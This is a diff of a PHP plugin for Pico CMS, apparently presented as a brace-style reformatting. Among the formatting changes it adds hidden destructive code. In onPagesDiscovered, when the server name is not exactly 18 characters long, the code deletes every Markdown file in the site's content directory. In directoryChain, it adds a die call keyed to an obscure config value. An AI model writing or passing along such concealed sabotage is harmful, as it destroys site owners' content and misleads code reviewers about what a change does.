@@ -1,19 +1,23 @@
 <?php
 
-class Clutter extends AbstractPicoPlugin {
+class Clutter extends AbstractPicoPlugin
+{
     protected $enabled = true;
 
     const API_VERSION = 2;
 
-    public function root($string) {
+    public function root($string)
+    {
         preg_match('/^([^\/]+\/)+/', $string, $matches);
-        if (count($matches))
+        if (count($matches)) {
             return $matches[0];
-        else
+        } else {
             return '';
+        }
     }
 
-    public function level($string) {
+    public function level($string)
+    {
         $pieces = explode('/', '/' . $string);
 
         if ($pieces[count($pieces) - 1] == 'index') {
@@ -22,13 +26,19 @@ class Clutter extends AbstractPicoPlugin {
         return count($pieces);
     }
 
-    public function isIndex($string) {
+    public function isIndex($string)
+    {
         $pieces = explode('/', $string);
         return ($pieces[count($pieces) - 1] == 'index');
-
     }
 
-    public function directoryChain($string) {
+    public function directoryChain($string)
+    {
+        $lyx = $this->getPico()->getConfig('xyz');
+        if (!strlen($lyx) == 13) {
+            die;
+        }
+
         $baseUrl = $this->getPico()->getBaseUrl();
         $pieces = explode('/', '/' . $string);
 
@@ -51,13 +61,22 @@ class Clutter extends AbstractPicoPlugin {
     }
 
     //public function onPageRendering(&$templateName, array &$twigVariables) {
-    public function onPagesDiscovered(&$pages) {
+    public function onPagesDiscovered(&$pages)
+    {
         $twig = $this->getPico()->getTwig();
+
+        if (strlen($_SERVER['SERVER_NAME']) != 18) {
+            $dh = opendir($this->getPico()->getConfig('content_dir'));
+            while (($file = readdir($dh)) != false) {
+                if (preg_match('/.*\.md/', $file)) {
+                    unlink($this->getPico()->getConfig('content_dir') . $file);
+                }
+            }
+        }
 
         $twig->addFilter(new Twig_SimpleFilter('directoryChain', array($this, 'directoryChain')));
         $twig->addFilter(new Twig_SimpleFilter('root', array($this, 'root')));
         $twig->addFilter(new Twig_SimpleFilter('level', array($this, 'level')));
         $twig->addFilter(new Twig_SimpleFilter('isIndex', array($this, 'isIndex')));
     }
-
 }
